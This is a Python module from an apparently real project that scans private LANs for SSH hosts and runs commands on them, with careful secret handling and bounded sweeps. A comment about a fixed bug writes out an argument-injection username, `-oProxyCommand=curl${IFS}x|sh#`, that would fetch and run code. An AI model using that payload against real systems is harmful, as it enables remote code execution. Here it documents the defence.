"""
SSH reach — discover machines on a LAN and run commands on them, safely.

This is the one place in NMesh that holds a *foreign* credential (an SSH
password or key passphrase). Everything here is built around one rule:

    **A credential lives in memory, for the duration of one run, and nowhere
    else.** Not on disk, not in ``argv`` (``ps`` shows argv to every local
    user), not in the environment (``/proc/<pid>/environ``), not in a log line,
    not in the app drawer, not in a mesh packet.

The mechanism is a pseudo-terminal: OpenSSH only ever reads a password from its
controlling tty, so we give it one, write the secret into it at the prompt, and
close it. The secret crosses a kernel pipe into a process we spawned; it is
never an argument, never a file, never an env var.

Why OpenSSH and not a Python SSH stack
--------------------------------------
Rolling a fresh SSH implementation means rolling fresh cryptographic protocol
code — key exchange, host-key verification, channel multiplexing — on the path
that provisions new machines. The charter puts security first and prefers not
inventing crypto: the system ``ssh`` binary is audited, ubiquitous, and adds no
Python dependency. The cost is a runtime requirement (an ``ssh`` client on the
provisioning host) which we detect and report, rather than a silent weakness.

Host keys are **not** blindly accepted. A scan records each host's key
fingerprint; the operator confirms the ones they mean to provision; the run then
pins exactly those in a throwaway ``known_hosts`` with ``StrictHostKeyChecking=
yes``. That is real trust-on-first-use with a human in the loop, not the
``accept-new`` shrug that signs off on any man in the middle.
"""
from __future__ import annotations

import asyncio
import ipaddress
import os
import re
import socket
import shutil
import tempfile

from ..ip_utils import bounded_getaddrinfo, local_networks, split_host_port

SSH_PORT = 22

# Scan bounds — a discovery sweep must never become the flood it looks like.
MAX_HOSTS = 1024              # addresses probed in one sweep
MAX_CONCURRENCY = 128         # simultaneous connect attempts
CONNECT_TIMEOUT = 1.5         # seconds per host
BANNER_TIMEOUT = 1.5
MAX_BANNER = 256
MAX_SUBNETS = 16              # attached networks considered in one sweep
MAX_NET_ADDRESSES = 4096      # per network; anything larger is narrowed, not swept

# Command bounds.
EXEC_TIMEOUT = 120.0
MAX_OUTPUT = 256 * 1024       # bytes of remote output we keep per run
_MAX_KEYS = 32
_MAX_KEY_BYTES = 64 * 1024

# Prompts OpenSSH writes to the tty. Matched case-insensitively on the tail of
# the output so far, so a prompt split across reads is still caught.
_PASSWORD_PROMPTS = (b"password:", b"password for", b"'s password:")
# `sudo` and `su` also read from the controlling tty, so the same pty that
# answers OpenSSH answers them. They are matched separately from the login
# prompt because the secret is a different one: escalating is not logging in,
# and typing the SSH password at a sudo prompt would burn a real attempt.
_ELEVATE_PROMPTS = (b"[sudo] password for", b"nmesh-elevate-password:")
_PASSPHRASE_PROMPTS = (b"enter passphrase for key", b"passphrase for key")
_DENIED = (b"permission denied", b"authentication failed",
           b"too many authentication failures")


class SshError(Exception):
    """A run failed for a reason worth telling the operator about."""


def watch_pty(fd: int, on_chunk, on_eof=None):
    """Stream a pty master into ``on_chunk`` via the event loop's reader.

    Deliberately **not** a thread. A blocking ``os.read`` on a pty whose peer
    never closes would sit in the default executor, which asyncio *joins* at
    shutdown — the exact failure mode recorded in
    ``Docs/Architecture/gotchas.md`` §2, where a stuck probe thread froze
    ``asyncio.run()`` on exit. A non-blocking fd plus ``add_reader`` has no
    thread to join and no read to get stuck in.

    Returns a ``stop()`` callable; it is also invoked automatically at EOF."""
    loop = asyncio.get_running_loop()
    try:
        os.set_blocking(fd, False)
    except OSError:
        pass
    stopped = False

    def stop() -> None:
        nonlocal stopped
        if stopped:
            return
        stopped = True
        try:
            loop.remove_reader(fd)
        except (OSError, ValueError, RuntimeError):
            pass

    def ready() -> None:
        try:
            chunk = os.read(fd, 4096)
        except BlockingIOError:
            return
        except OSError:
            chunk = b""          # EIO on Linux once the child hangs up
        if not chunk:
            stop()
            if on_eof is not None:
                try:
                    on_eof()
                except Exception:
                    pass
            return
        try:
            on_chunk(chunk)
        except Exception:
            pass                 # a bad consumer must not kill the reader

    loop.add_reader(fd, ready)
    return stop


def ssh_available() -> bool:
    """Is an OpenSSH client present? Provisioning is refused up front if not."""
    return shutil.which("ssh") is not None


# ---------------------------------------------------------------------------
# Credentials — held in memory, wiped after use
# ---------------------------------------------------------------------------

# An account name, conservatively. The old test was "non-empty, at most 64
# characters, no whitespace", which lets a name begin with `-` — and the name is
# pasted into an argv element as `user@host`, where OpenSSH parses a leading `-`
# as an option and `-o` takes its argument attached. `${IFS}` supplies the spaces
# this forbids, so `-oProxyCommand=curl${IFS}x|sh#` passed every check and ran
# through /bin/sh. The destination is also passed as `-l user host` now, so a
# stray dash can never lead an argv element in the first place.
_ACCOUNT_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_.-]{0,31}$")


def _usable_key_path(path: str) -> bool:
    """A key path we will hand to ``ssh -i``.

    Absolute, no NUL, and — the point — not starting with a dash: `-i` takes a
    separate argv element, so a value beginning with `-` is parsed as an option
    of its own."""
    return (isinstance(path, str) and 0 < len(path) <= 512
            and "\x00" not in path and not path.startswith("-")
            and os.path.isabs(path))


class SshCredentials:
    """One machine's login material, for one provisioning run.

    Deliberately not a dataclass and deliberately without ``__repr__``/
    ``__str__`` beyond a redacted form: an accidental ``print(creds)`` or an
    exception rendering its locals must not spill the secret. ``wipe()`` drops
    the references as soon as the run is over (CPython strings are immutable, so
    this releases rather than scrubs — the honest bound is "not kept", not
    "erased from RAM")."""

    __slots__ = ("username", "_password", "key_path", "_key_data",
                 "_key_passphrase", "sudo_user", "_sudo_password", "can_sudo")

    def __init__(self, username: str, *, password: str | None = None,
                 key_path: str | None = None, key_data: str | None = None,
                 key_passphrase: str | None = None,
                 can_sudo: bool = True, sudo_user: str | None = None,
                 sudo_password: str | None = None) -> None:
        if not _ACCOUNT_RE.match(username or ""):
            raise SshError("invalid username")
        if sudo_user is not None and not _ACCOUNT_RE.match(sudo_user):
            raise SshError("invalid sudo username")
        if key_path is not None and not _usable_key_path(key_path):
            raise SshError("invalid key path")
        self.username = username
        # Whether the login account may itself run sudo, and — when it may not —
        # the account that can. Escalation is stated by the operator rather than
        # discovered: probing for it means failed sudo attempts in the target's
        # auth log, and a machine that logs those is right to.
        self.can_sudo = bool(can_sudo)
        self.sudo_user = sudo_user or None
        self._sudo_password = sudo_password or None
        self._password = password or None
        self.key_path = key_path or None
        # Key *material*, for a key that has no path on this machine — one
        # uploaded through the console, or sent to the node running the SSH.
        # It is written to a private temp file only while a command runs.
        self._key_data = key_data or None
        self._key_passphrase = key_passphrase or None

    @property
    def has_password(self) -> bool:
        return self._password is not None

    @property
    def has_elevation(self) -> bool:
        """Can this run reach root at all? (Being root already is decided on
        the target, not here.)"""
        return self.can_sudo or self.sudo_user is not None

    @property
    def elevate_secret(self) -> str | None:
        """The password an escalation prompt should be answered with.

        Sudo for the login user asks for *its* password, which is the SSH one
        unless the operator said otherwise; ``su`` to another account asks for
        that account's."""
        if self.sudo_user is not None:
            return self._sudo_password
        return self._sudo_password or self._password

    @property
    def has_key(self) -> bool:
        return self.key_path is not None or self._key_data is not None

    def wipe(self) -> None:
        self._password = None
        self._key_passphrase = None
        self._key_data = None
        self._sudo_password = None

    def __repr__(self) -> str:
        return (f"SshCredentials(username={self.username!r}, "
                f"password={'<set>' if self._password else None}, "
                f"sudo_user={self.sudo_user!r}, "
                f"sudo_password={'<set>' if self._sudo_password else None}, "
                f"key_path={self.key_path!r}, "
                f"key_data={'<set>' if self._key_data else None})")

    __str__ = __repr__


class MaterialisedKey:
    """Give OpenSSH a file for a key we only hold as bytes.

    ``ssh -i`` needs a path, so an uploaded key has to touch a filesystem at
    some point. The window is one command: a 0700 directory holding a 0600 file,
    removed on the way out — the same shape as :class:`KnownHosts`. A key that
    already has a path is passed through untouched, and nothing is written."""

    def __init__(self, creds: SshCredentials) -> None:
        self._creds = creds
        self._dir: str | None = None
        self.path = creds.key_path

    def __enter__(self) -> "MaterialisedKey":
        if self._creds.key_path or not self._creds._key_data:
            return self
        self._dir = tempfile.mkdtemp(prefix="nmesh-key-")
        os.chmod(self._dir, 0o700)
        self.path = os.path.join(self._dir, "id")
        descriptor = os.open(self.path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        try:
            material = self._creds._key_data
            if not material.endswith("\n"):
                material += "\n"     # OpenSSH refuses a key without a final newline
            os.write(descriptor, material.encode("utf-8"))
        finally:
            os.close(descriptor)
        return self

    def __exit__(self, *exc) -> None:
        if self._dir is not None:
            shutil.rmtree(self._dir, ignore_errors=True)
            self._dir, self.path = None, self._creds.key_path


def discover_private_keys(ssh_dir: str | None = None) -> list[dict]:
    """List candidate private keys in the local ``~/.ssh``.

    Returns **metadata only** — path, whether it is passphrase-protected, and
    the public counterpart's comment when a ``.pub`` sits beside it. The private
    material is never read into the app's state; ``ssh -i`` reads the file itself
    at connect time, so the key never transits this process."""
    base = ssh_dir or os.path.join(os.path.expanduser("~"), ".ssh")
    found: list[dict] = []
    try:
        names = sorted(os.listdir(base))
    except OSError:
        return []
    for name in names:
        if len(found) >= _MAX_KEYS or name.endswith((".pub", ".old", ".bak")):
            continue
        path = os.path.join(base, name)
        try:
            if not os.path.isfile(path) or os.path.getsize(path) > _MAX_KEY_BYTES:
                continue
            with open(path, "rb") as handle:
                head = handle.read(4096)
        except OSError:
            continue
        if b"PRIVATE KEY" not in head:
            continue
        entry = {
            "path": path,
            "name": name,
            # OpenSSH-format keys carry their own KDF marker; classic PEM says so
            # in the header. Either way this is a hint for the UI, not a gate.
            "encrypted": (b"ENCRYPTED" in head
                          or (b"OPENSSH PRIVATE KEY" in head
                              and b"bcrypt" in head)),
            "comment": _pub_comment(path + ".pub"),
        }
        found.append(entry)
    return found


def _pub_comment(path: str) -> str | None:
    try:
        with open(path, encoding="utf-8", errors="replace") as handle:
            parts = handle.read(4096).split()
    except OSError:
        return None
    return parts[2][:128] if len(parts) >= 3 else None


# ---------------------------------------------------------------------------
# LAN discovery — who here speaks SSH?
# ---------------------------------------------------------------------------

def detected_networks() -> list[dict]:
    """Every network this node is attached to, with the prefix actually in use.

    Real interface enumeration (see :func:`src.ip_utils.local_networks`), not a
    /24 guessed around an address: a LAN on a /22 or /16 would otherwise be
    swept as a fraction of itself, and interfaces the outbound-route probe never
    touches (a second NIC, a VPN, a bridge) would be missed entirely.

    A network larger than :data:`MAX_NET_ADDRESSES` is **narrowed** around our
    own address rather than dropped: sweeping a /16 is 65k connects, which is
    neither a LAN discovery nor something to start by accident. The narrowing is
    reported so the operator can widen it deliberately by typing the prefix."""
    out = []
    for entry in local_networks():
        try:
            net = ipaddress.ip_network(entry["cidr"], strict=False)
        except ValueError:
            continue
        record = {
            "cidr": str(net),
            "scan": str(net),
            "ip": entry.get("ip"),
            "interface": entry.get("interface"),
            "hosts": max(0, net.num_addresses - 2),
            "narrowed": False,
        }
        if net.num_addresses > MAX_NET_ADDRESSES:
            narrowed = _narrow(net, entry.get("ip"))
            if narrowed is None:
                continue          # too big and we cannot centre it: skip openly
            record["scan"] = str(narrowed)
            record["narrowed"] = True
        out.append(record)
        if len(out) >= MAX_SUBNETS:
            break
    return out


def _narrow(net, address) -> "ipaddress.IPv4Network | None":
    """The largest scannable slice of ``net`` containing ``address``."""
    if not address:
        return None
    prefix = net.prefixlen
    while prefix < 32 and (1 << (32 - prefix)) > MAX_NET_ADDRESSES:
        prefix += 1
    try:
        return ipaddress.ip_network(f"{address}/{prefix}", strict=False)
    except ValueError:
        return None


def local_subnets() -> list[str]:
    """The subnets a sweep would actually cover, ready to expand into hosts."""
    return [entry["scan"] for entry in detected_networks()]


def subnet_hosts(subnets: list[str], limit: int = MAX_HOSTS) -> list[str]:
    """Expand subnets into a bounded, de-duplicated host list."""
    hosts: list[str] = []
    seen: set[str] = set()
    for entry in subnets[:MAX_SUBNETS]:
        try:
            net = ipaddress.ip_network(entry, strict=False)
        except ValueError:
            continue
        if net.version != 4 or net.num_addresses > MAX_NET_ADDRESSES:
            continue          # refuse a sweep too large to be a LAN
        if not net.is_private or net.is_loopback or net.is_link_local:
            # Sweeping a public prefix is scanning strangers, whoever typed it.
            # Naming one machine is different and stays allowed — see
            # parse_targets.
            continue
        for host in net.hosts():
            text = str(host)
            if text in seen:
                continue
            seen.add(text)
            hosts.append(text)
            if len(hosts) >= limit:
                return hosts
    return hosts


async def probe_host(ip: str, port: int = SSH_PORT,
                     timeout: float = CONNECT_TIMEOUT) -> dict | None:
    """Connect and read the SSH banner. ``None`` for anything that is not SSH.

    Nothing is sent: we open the socket, read the server's greeting, and close.
    A host that does not answer, answers something else, or answers too much is
    simply not reported."""
    writer = None
    try:
        async with asyncio.timeout(timeout):
            reader, writer = await asyncio.open_connection(ip, port)
        async with asyncio.timeout(BANNER_TIMEOUT):
            banner = await reader.read(MAX_BANNER)
    except (OSError, asyncio.TimeoutError, ConnectionError):
        return None
    finally:
        if writer is not None:
            try:
                writer.close()
            except Exception:
                pass
    if not banner.startswith(b"SSH-"):
        return None
    text = banner.split(b"\r\n", 1)[0].split(b"\n", 1)[0]
    return {
        "ip": ip,
        "port": port,
        "banner": text.decode("utf-8", "replace")[:MAX_BANNER],
    }


async def parse_targets(entries: list[str], *,
                        default_port: int = SSH_PORT,
                        limit: int = MAX_HOSTS) -> tuple[list[tuple[str, int]], list[str]]:
    """Turn what the operator typed into concrete ``(ip, port)`` probes.

    Four shapes are accepted, so "scan my LAN" and "look at exactly that box"
    are the same field:

    ==========================  ==============================================
    ``192.168.1.0/24``          a subnet to sweep
    ``192.168.1.42``            one machine, default SSH port
    ``192.168.1.42:2222``       one machine, explicit port
    ``nas.lan`` / ``nas:2222``  one machine by name, resolved here
    ==========================  ==============================================

    Returns ``(targets, rejected)`` — whatever could not be understood comes
    back named, rather than being dropped in silence.

    A **subnet** must still be private and small enough to be a LAN: sweeping a
    public range is scanning strangers. A **single host** the operator typed by
    hand is one connect to a machine they named, so it is allowed anywhere —
    naming a box is not a sweep."""
    targets: list[tuple[str, int]] = []
    rejected: list[str] = []
    seen: set[tuple[str, int]] = set()

    def keep(ip: str, port: int) -> None:
        key = (ip, port)
        if key not in seen and len(targets) < limit:
            seen.add(key)
            targets.append(key)

    for raw in list(entries)[:MAX_SUBNETS * 4]:
        if not isinstance(raw, str):
            continue
        text = raw.strip()
        if not text:
            continue
        if "/" in text:                                   # a subnet
            hosts = subnet_hosts([text], limit=limit - len(targets))
            if not hosts:
                rejected.append(text)
            for ip in hosts:
                keep(ip, default_port)
            continue
        host, port = _split_target(text, default_port)
        if host is None:
            rejected.append(text)
            continue
        resolved = await _resolve(host)
        if resolved is None:
            rejected.append(text)
            continue
        keep(resolved, port)
    return targets, rejected


def _split_target(text: str, default_port: int) -> tuple[str | None, int]:
    """Split ``host``, ``host:port`` or ``[v6]:port``. Port defaults, and an
    out-of-range one makes the whole entry invalid rather than silently 22."""
    if text.startswith("["):
        parsed = split_host_port(text)
        if parsed is None:
            return (text[1:-1], default_port) if text.endswith("]") else (None, 0)
        host, port_text = parsed
    elif text.count(":") == 1:
        host, port_text = text.rsplit(":", 1)
    else:
        # A bare IPv6 literal has several colons and no port.
        return (text, default_port) if text else (None, 0)
    if not host:
        return None, 0
    try:
        port = int(port_text)
    except ValueError:
        return None, 0
    return (host, port) if 0 < port < 65536 else (None, 0)


async def _resolve(host: str) -> str | None:
    """An IP literal passes straight through; a name is resolved off the loop.

    Names must be resolved *here* rather than left to ``open_connection``: that
    would resolve on asyncio's default executor, which is joined at shutdown
    (``gotchas.md`` §2)."""
    try:
        ipaddress.ip_address(host)
        return host
    except ValueError:
        pass
    try:
        info = await bounded_getaddrinfo(host, 0, type=socket.SOCK_STREAM,
                                         timeout=5.0)
    except (OSError, asyncio.TimeoutError, Exception):
        return None
    for entry in info:
        address = entry[4][0]
        if address:
            return address.split("%", 1)[0]
    return None


async def scan(entries: list[str] | None = None, *, port: int = SSH_PORT,
               timeout: float = CONNECT_TIMEOUT,
               concurrency: int = MAX_CONCURRENCY,
               limit: int = MAX_HOSTS,
               progress=None) -> tuple[list[dict], list[str]]:
    """Look for SSH listeners and return ``(found, rejected)``.

    ``entries`` mixes subnets and precise machines (see :func:`parse_targets`).
    With none, every attached network is swept. Bounded in hosts, in parallelism
    and in time."""
    if entries:
        targets, rejected = await parse_targets(entries, default_port=port,
                                                limit=limit)
    else:
        targets = [(ip, port) for ip in subnet_hosts(local_subnets(), limit=limit)]
        rejected = []
    semaphore = asyncio.Semaphore(max(1, min(concurrency, MAX_CONCURRENCY)))
    results: list[dict] = []
    done = 0

    async def one(ip: str, target_port: int) -> None:
        nonlocal done
        async with semaphore:
            found = await probe_host(ip, target_port, timeout)
        if found is not None:
            results.append(found)
        done += 1
        if progress is not None and done % 32 == 0:
            try:
                progress(done, len(targets), len(results))
            except Exception:
                pass  # a progress callback must never break the sweep

    await asyncio.gather(*(one(ip, p) for ip, p in targets),
                         return_exceptions=True)
    results.sort(key=_sort_key)
    return results, rejected


def _sort_key(item: dict):
    """Numeric for IPv4 so .9 precedes .10; textual for anything else."""
    try:
        return (0, int(ipaddress.ip_address(item["ip"])), item["port"])
    except ValueError:
        return (1, 0, item["port"])


async def host_key_fingerprints(ip: str, port: int = SSH_PORT,
                                timeout: float = 10.0) -> list[dict]:
    """Fetch a host's public host keys with ``ssh-keyscan``, with fingerprints.

    These are *public* keys — safe to show and to store. Showing the fingerprint
    to the operator before provisioning is what turns "trust on first use" into
    an informed decision instead of a blind one."""
    if shutil.which("ssh-keyscan") is None:
        return []
    keys = await _keyscan(ip, port, timeout)
    if not keys:
        return []
    out = []
    for line in keys.splitlines():
        parts = line.split()
        if len(parts) < 3 or line.startswith("#"):
            continue
        out.append({"type": parts[1][:32], "line": line[:1024],
                    "fingerprint": await _fingerprint(line)})
    return out[:8]


MAX_KEYSCAN_HOSTS = 64        # hosts we fingerprint in one pass
KEYSCAN_CONCURRENCY = 8


async def attach_host_keys(hosts: list[dict], *, timeout: float = 60.0,
                           limit: int = MAX_KEYSCAN_HOSTS) -> None:
    """Fill each host's ``keys`` in place, under one overall deadline.

    Concurrent and bounded on purpose. Fingerprinting host by host in series
    with only a per-host timeout meant a scan of a busy LAN could sit for many
    minutes after the sweep itself had finished, with nothing to show for it —
    on a remote node that reads as "the scan did nothing". Hosts we do not get
    to keep an empty key list, which the UI already renders as "no host key"."""
    for host in hosts:
        host.setdefault("keys", [])
    semaphore = asyncio.Semaphore(KEYSCAN_CONCURRENCY)

    async def one(host: dict) -> None:
        async with semaphore:
            try:
                host["keys"] = await host_key_fingerprints(host["ip"],
                                                           host["port"])
            except Exception:
                host["keys"] = []

    tasks = [asyncio.create_task(one(h)) for h in hosts[:limit]]
    if not tasks:
        return
    try:
        async with asyncio.timeout(timeout):
            await asyncio.gather(*tasks, return_exceptions=True)
    except asyncio.TimeoutError:
        for task in tasks:
            task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)


async def _keyscan(ip: str, port: int, timeout: float) -> str:
    try:
        proc = await asyncio.create_subprocess_exec(
            "ssh-keyscan", "-T", str(int(timeout)), "-p", str(port), ip,
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.DEVNULL)
    except OSError:
        return ""
    try:
        async with asyncio.timeout(timeout + 2):
            stdout, _ = await proc.communicate()
    except (asyncio.TimeoutError, OSError):
        _kill(proc)
        return ""
    return stdout.decode("utf-8", "replace")[:8192]


async def _fingerprint(known_hosts_line: str) -> str | None:
    """SHA256 fingerprint via ``ssh-keygen -lf -``. None if unavailable."""
    if shutil.which("ssh-keygen") is None:
        return None
    try:
        proc = await asyncio.create_subprocess_exec(
            "ssh-keygen", "-l", "-f", "-",
            stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.DEVNULL)
        async with asyncio.timeout(5):
            stdout, _ = await proc.communicate(known_hosts_line.encode())
    except (OSError, asyncio.TimeoutError):
        return None
    parts = stdout.decode("utf-8", "replace").split()
    return parts[1][:128] if len(parts) >= 2 else None


# ---------------------------------------------------------------------------
# Running something over SSH, with the secret confined to a pty
# ---------------------------------------------------------------------------

def _base_options(known_hosts: str | None, creds: SshCredentials,
                  port: int, key_path: str | None = None) -> list[str]:
    """Common ``ssh`` options. No secret appears here — argv is world-readable."""
    options = [
        "-p", str(port),
        "-o", "ConnectTimeout=10",
        "-o", "NumberOfPasswordPrompts=1",
        # Never let a run silently fall back to the operator's agent or default
        # identities: what authenticates must be what the operator chose.
        "-o", "IdentityAgent=none",
        "-o", "GSSAPIAuthentication=no",
        "-o", "ClearAllForwardings=yes",
        "-o", "ExitOnForwardFailure=yes",
    ]
    if known_hosts:
        # Pinned keys the operator confirmed: refuse anything else outright.
        options += ["-o", "StrictHostKeyChecking=yes",
                    "-o", f"UserKnownHostsFile={known_hosts}",
                    "-o", "UpdateHostKeys=no"]
    else:
        # Nothing confirmed to pin (no ssh-keyscan on the scanning host, or the
        # target offered no key we could read). accept-new trusts the first key
        # it sees; callers announce this so the operator knows what they got.
        options += ["-o", "StrictHostKeyChecking=accept-new"]
    key_path = key_path or creds.key_path
    if key_path:
        options += ["-i", key_path, "-o", "IdentitiesOnly=yes"]
        methods = "publickey,password,keyboard-interactive" if creds.has_password \
            else "publickey"
    else:
        methods = "password,keyboard-interactive"
    options += ["-o", f"PreferredAuthentications={methods}"]
    if not creds.has_password:
        options += ["-o", "BatchMode=yes"]     # no prompt we could not answer
    return options


class KnownHosts:
    """A throwaway ``known_hosts`` holding exactly the keys the operator
    confirmed. Public material only; removed when the run ends."""

    def __init__(self, lines: list[str]) -> None:
        self._lines = [line for line in lines if isinstance(line, str)][:32]
        self.path: str | None = None
        self._dir: str | None = None

    def __enter__(self) -> "KnownHosts":
        if not self._lines:
            return self
        self._dir = tempfile.mkdtemp(prefix="nmesh-kh-")
        os.chmod(self._dir, 0o700)
        self.path = os.path.join(self._dir, "known_hosts")
        descriptor = os.open(self.path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        try:
            os.write(descriptor, ("\n".join(self._lines) + "\n").encode())
        finally:
            os.close(descriptor)
        return self

    def __exit__(self, *exc) -> None:
        if self._dir is not None:
            shutil.rmtree(self._dir, ignore_errors=True)
            self._dir, self.path = None, None


async def run(host: str, creds: SshCredentials, command: list[str], *,
              port: int = SSH_PORT, known_hosts_lines: list[str] | None = None,
              stdin_data: bytes = b"", timeout: float = EXEC_TIMEOUT,
              request_tty: bool = False, on_output=None) -> tuple[int, str]:
    """Run ``command`` (an argv list, never a shell string) on ``host``.

    Returns ``(exit_status, output)``. The password — if any — is written into
    the pty when OpenSSH asks for it and never appears anywhere else. Output is
    capped at :data:`MAX_OUTPUT`; ``on_output(chunk)`` streams it live.

    ``stdin_data`` is piped to the remote command through a separate pipe, so a
    provisioning payload never has to share the channel that carries the
    secret.

    ``request_tty`` forces a terminal on the **remote** side (``-tt``). Without
    one, ``sudo`` and ``su`` refuse to ask for a password at all — and with one,
    their prompt travels back to the local pty where the same machinery that
    answers OpenSSH answers them. It is mutually exclusive with ``stdin_data``:
    with a remote tty, stdin *is* the terminal, so piped data and a password
    prompt would be reading the same channel."""
    if not ssh_available():
        raise SshError("no ssh client on this host")
    if not command:
        raise SshError("empty command")
    if request_tty and stdin_data:
        raise SshError("cannot pipe data into a command that needs a terminal")
    with KnownHosts(known_hosts_lines or []) as known, MaterialisedKey(creds) as key:
        argv = ["ssh"] + _base_options(known.path, creds, port, key.path)
        if request_tty:
            argv += ["-tt"]
        # `-l user host`, never `user@host`: gluing them makes one argv element
        # whose first character the caller chooses, and OpenSSH reads a leading
        # dash as an option. `--` still separates the remote command.
        argv += ["-l", creds.username, host, "--"] + list(command)
        return await _spawn_with_pty(argv, creds, stdin_data, timeout,
                                     on_output, tty_stdio=request_tty)


def _silence_echo(fd: int) -> None:
    """Stop the tty echoing what we type back at us.

    Without this, a password written into the pty comes straight back out on the
    same terminal and lands in the collected output — which is streamed to the
    operator's log. The secret would leak by being *typed*, which is a poor way
    to lose one."""
    import termios
    try:
        attrs = termios.tcgetattr(fd)
        attrs[3] &= ~termios.ECHO          # lflag
        termios.tcsetattr(fd, termios.TCSANOW, attrs)
    except (termios.error, OSError):
        pass                               # a tty that will not co-operate


async def _spawn_with_pty(argv: list[str], creds: SshCredentials,
                          stdin_data: bytes, timeout: float,
                          on_output, tty_stdio: bool = False) -> tuple[int, str]:
    """Spawn ssh with a controlling pty for prompts and a pipe for payload data.

    The pty is what makes the "secret never on disk, never in argv" property
    work: OpenSSH reads its prompts from the terminal, so the password crosses a
    kernel tty buffer into the child and nothing else ever holds it.

    ``tty_stdio`` puts ssh's stdin and stdout on that same pty. It is what a
    remote terminal (``-tt``) needs: ``sudo``'s prompt then travels back over
    the channel to ssh's stdout, and the answer has to go into ssh's stdin to be
    forwarded on. Routing both through the pty keeps the secret in a terminal
    from end to end instead of putting it through a pipe."""
    import pty

    parent_fd, child_fd = pty.openpty()
    _silence_echo(parent_fd)
    try:
        proc = await asyncio.create_subprocess_exec(
            *argv,
            stdin=child_fd if tty_stdio else asyncio.subprocess.PIPE,
            stdout=child_fd if tty_stdio else asyncio.subprocess.PIPE,
            stderr=child_fd,          # prompts and diagnostics go to the tty
            start_new_session=True,   # the pty becomes the controlling terminal
            preexec_fn=_make_controlling_tty(child_fd),
        )
    except OSError as exc:
        os.close(parent_fd)
        os.close(child_fd)
        raise SshError(f"cannot start ssh: {exc}") from exc
    os.close(child_fd)

    collected = bytearray()
    prompts_answered = {"password": 0, "passphrase": 0, "elevate": 0,
                        "may_elevate": 1 if tty_stdio else 0}
    tail = b""

    def on_tty(chunk: bytes) -> None:
        """Watch the terminal side: answer prompts, collect diagnostics.

        The prompt match runs over a rolling tail rather than the chunk, so a
        prompt split across two reads is still recognised."""
        nonlocal tail
        _collect(collected, chunk, on_output)
        tail = (tail + chunk.lower())[-512:]
        answer = _prompt_answer(tail, creds, prompts_answered)
        if answer is not None:
            try:
                os.write(parent_fd, answer)
            except OSError:
                pass
            tail = b""          # never match the same prompt twice

    stop_tty = watch_pty(parent_fd, on_tty)

    async def pump_stdout() -> None:
        while True:
            chunk = await proc.stdout.read(65536)
            if not chunk:
                return
            _collect(collected, chunk, on_output)

    async def feed_stdin() -> None:
        try:
            if stdin_data:
                proc.stdin.write(stdin_data)
                await proc.stdin.drain()
            proc.stdin.close()
        except (BrokenPipeError, ConnectionResetError, OSError):
            pass

    # With tty_stdio there are no pipes to pump: stdin and stdout are the pty,
    # which the reader above already watches and the prompt answerer writes to.
    tasks = []
    if not tty_stdio:
        tasks.append(asyncio.create_task(pump_stdout()))
        tasks.append(asyncio.create_task(feed_stdin()))
    try:
        async with asyncio.timeout(timeout):
            status = await proc.wait()
    except asyncio.TimeoutError:
        _kill(proc)
        status = -1
        collected += b"\n[nmesh] timed out\n"
    finally:
        stop_tty()
        for task in tasks:
            task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
        try:
            os.close(parent_fd)
        except OSError:
            pass
    text = bytes(collected).decode("utf-8", "replace")
    if status != 0 and any(marker in text.lower().encode() for marker in _DENIED):
        raise SshError("authentication failed")
    return status, text


def _make_controlling_tty(child_fd: int):
    """Make the child's session own the pty, so OpenSSH finds a terminal to
    prompt on. Runs in the forked child, before exec — keep it tiny."""
    def _setup() -> None:
        try:
            os.setsid()
        except OSError:
            pass
        try:
            import fcntl
            import termios
            fcntl.ioctl(child_fd, termios.TIOCSCTTY, 0)
        except Exception:
            pass
    return _setup


def _read_fd(fd: int) -> bytes:
    try:
        return os.read(fd, 4096)
    except (OSError, ValueError):
        return b""


def _collect(buffer: bytearray, chunk: bytes, on_output) -> None:
    """Append bounded output and stream it on. Past the cap we keep counting the
    run but stop growing — a chatty remote cannot exhaust us."""
    if len(buffer) < MAX_OUTPUT:
        buffer += chunk[:MAX_OUTPUT - len(buffer)]
    if on_output is not None:
        try:
            on_output(chunk.decode("utf-8", "replace"))
        except Exception:
            pass


def _prompt_answer(tail: bytes, creds: SshCredentials,
                   answered: dict) -> bytes | None:
    """Decide what (if anything) to type at the prompt now on screen.

    Each prompt kind is answered **once**: OpenSSH re-prompting means the secret
    was wrong, and replaying it would just burn login attempts against a
    lockout. A second prompt is left unanswered so the run fails cleanly."""
    if any(marker in tail for marker in _PASSPHRASE_PROMPTS):
        if creds._key_passphrase and answered["passphrase"] == 0:
            answered["passphrase"] += 1
            return creds._key_passphrase.encode("utf-8") + b"\n"
        return None
    if not any(marker in tail
               for marker in _PASSWORD_PROMPTS + _ELEVATE_PROMPTS):
        return None
    # Which secret a password prompt wants is decided by *when* it appears, not
    # by how it is worded: `sudo` prompts with "password for" and `su` with a
    # bare "password:", both indistinguishable from OpenSSH's. The login prompt
    # is the one that comes first — after it (or with key auth, where it never
    # comes at all), a password prompt is an escalation asking for its own
    # secret. Answering that one with the SSH password would burn a real login
    # attempt against whatever lockout the target runs.
    login_pending = creds._password is not None and answered["password"] == 0
    if login_pending and not any(marker in tail for marker in _ELEVATE_PROMPTS):
        answered["password"] += 1
        return creds._password.encode("utf-8") + b"\n"
    # Only a run that asked for a remote terminal can be facing sudo or su.
    # Everywhere else a second password prompt is OpenSSH re-asking because the
    # first answer was wrong, and replaying it just burns login attempts against
    # whatever lockout the target runs.
    if not answered.get("may_elevate"):
        return None
    secret = creds.elevate_secret
    if secret and answered.get("elevate", 0) == 0:
        answered["elevate"] = answered.get("elevate", 0) + 1
        return secret.encode("utf-8") + b"\n"
    return None


def _kill(proc) -> None:
    try:
        proc.kill()
    except (ProcessLookupError, OSError):
        pass
